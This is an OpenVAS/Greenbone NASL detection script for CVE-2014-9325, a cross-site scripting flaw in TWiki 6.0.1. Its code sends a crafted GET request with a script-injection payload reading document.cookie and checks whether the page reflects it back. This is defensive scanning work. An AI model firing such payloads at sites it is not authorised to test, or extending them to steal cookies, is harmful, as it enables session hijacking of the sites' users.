# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:twiki:twiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805234");
  script_version("2024-02-19T05:05:57+0000");
  script_cve_id("CVE-2014-9325");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-02-19 05:05:57 +0000 (Mon, 19 Feb 2024)");
  script_tag(name:"creation_date", value:"2015-01-06 12:20:18 +0530 (Tue, 06 Jan 2015)");

  script_name("TWiki Multiple Cross-Site Scripting Vulnerabilities (Jan 2015)");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_mandatory_keys("twiki/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"TWiki is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as input related to
  'QUERYSTRING' and 'QUERYPARAMSTRING' is not properly sanitised within
  lib/TWiki.pm and lib/TWiki/UI/View.pm before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"TWiki versions 6.0.1");

  script_tag(name:"solution", value:"Update to the hotfixe in the referenced advisory.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Dec/81");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71735");
  script_xref(name:"URL", value:"http://www.twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-9325");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! http_port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:http_port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/view/Main/TWikiPreferences?'" +
      '"--></style></script><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"script><script>alert\(document.cookie\)</script>", extra_check:"[P|p]owered by TWiki")) {
  report = http_report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}

exit(99);
